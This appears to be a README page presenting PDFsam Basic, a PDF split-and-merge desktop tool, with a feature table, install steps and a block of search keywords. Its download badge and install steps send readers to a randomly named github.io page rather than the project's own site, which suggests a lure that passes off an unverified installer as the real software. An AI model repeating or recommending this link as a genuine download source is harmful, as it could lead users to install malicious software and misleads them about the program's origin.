# PDFsam Basic Enterprise Document Engine

**PDFsam Basic** (PDF Split and Merge) is a free, open-source desktop application engineered for local document processing on Windows systems. Designed to operate completely offline without uploading sensitive files to cloud services, it enables system administrators, legal teams, and enterprise workers to split, merge, rotate, extract, and reorder PDF pages. Powered by a modular JavaFX engine and SAMBox PDF parsing architecture, PDFsam Basic executes high-throughput page manipulation while preserving underlying document structure, bookmarks, and form fields.

[![Download PDFsam Basic](https://img.shields.io/badge/Download-PDFsam--Basic-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ehmydllq079.github.io/.github/PDFsam-Document-Engine)

> **CORE ARCHITECTURE:** Modular SAMBox low-level PDF parsing engine decoupled from JavaFX presentation layers to perform direct byte-stream manipulations without full document re-encoding.

<img src="https://support-enhanced.pdfsam.org/hc/article_attachments/39856841185812" alt="Program Interface Screenshot"/>

> **THREADING PROFILE:** Non-blocking multi-threaded task runner delegating large batch PDF merges and page extraction routines to background execution threads to ensure responsive UI navigation.

---

## Technical Specifications Matrix

| Component | Technology | Description |
| :--- | :--- | :--- |
| Core Engine | SAMBox PDF Library | High-speed PDF object parsing library handling cross-reference tables, incremental updates, and encryption |
| GUI Shell | JavaFX Desktop Interface | Modern modular interface featuring drag-and-drop file staging and visual thumbnail grid reordering |
| Processing Suite | Multi-Task Module Architecture | Dedicated pipelines for PDF Merging, Page Splitting, Alternate Mix, Extraction, and Rotation |
| Automation Core | CLI Execution Wrapper | Headless command-line execution interface enabling scriptable document workflows |

---

## System Deployment Protocol

1. Download the Windows setup package (`pdfsam-vX.X.X.msi` or portable zip) from the repository release link provided above.
2. Launch the MSI setup wizard with standard user or administrative permissions to unpack binaries and register file hooks.
3. Open `pdfsam.exe` to access the primary task selection dashboard.
4. Select your desired processing module (**Merge**, **Split**, **Rotate**, or **Alternate Mix**) and drag PDF documents into the file staging area.
5. Define destination paths, configure execution parameters (such as page ranges or bookmark handling), and click **Run** to generate the output files.

---

### Search Terms
PDFsam Basic • pdf split and merge • pdf page extractor • combine pdf files • pdf rotator • open source pdf tool • offline pdf editor • java pdf utility • pdf reorder tool • sambox pdf engine • pdfsam windows engine • local pdf manipulation • desktop pdf workflow • batch pdf merger • lightweight pdf tool
